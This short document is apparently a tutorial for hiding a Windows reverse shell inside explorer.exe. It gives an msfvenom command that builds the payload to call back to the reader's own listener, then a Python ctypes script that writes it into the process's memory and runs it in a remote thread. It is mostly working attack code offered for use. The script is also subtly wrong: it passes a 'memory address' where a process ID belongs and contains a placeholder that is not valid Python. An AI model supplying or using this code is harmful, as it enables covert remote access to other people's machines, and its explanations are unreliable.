#First, we need to create a payload using the Metasploit Framework. We can use the following command to generate a simple Windows reverse shell payload in raw format:

msfvenom -p windows/shell_reverse_tcp LHOST=<your IP address> LPORT=<your listening port> -f raw -o payload.raw

#Next, we need to create a Python script that will inject the payload into explorer.exe. Here's an example:

import struct
import ctypes

# Replace with your own payload file name
filename = "payload.raw"

# Open the payload file and read its contents
with open(filename, "rb") as f:
    payload = f.read()

# Convert the memory address of the explorer.exe process to an integer
explorer_addr = 0x{insert explorer.exe address here}

# Open the process using the obtained address
process = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, explorer_addr)

# Allocate memory in the explorer.exe process for the payload
address = ctypes.windll.kernel32.VirtualAllocEx(process, 0, len(payload), 0x1000, 0x40)

# Write the payload to the allocated memory
written = ctypes.c_ulong(0)
ctypes.windll.kernel32.WriteProcessMemory(process, address, payload, len(payload), ctypes.byref(written))

# Create a new thread in the explorer.exe process that will execute the payload
thread_id = ctypes.c_ulong(0)
kernel32 = ctypes.windll.kernel32
start_addr = address
hThread = kernel32.CreateRemoteThread(process, None, 0, start_addr, None, 0, ctypes.byref(thread_id))

print(f"Injected payload into explorer.exe with thread ID {thread_id}")
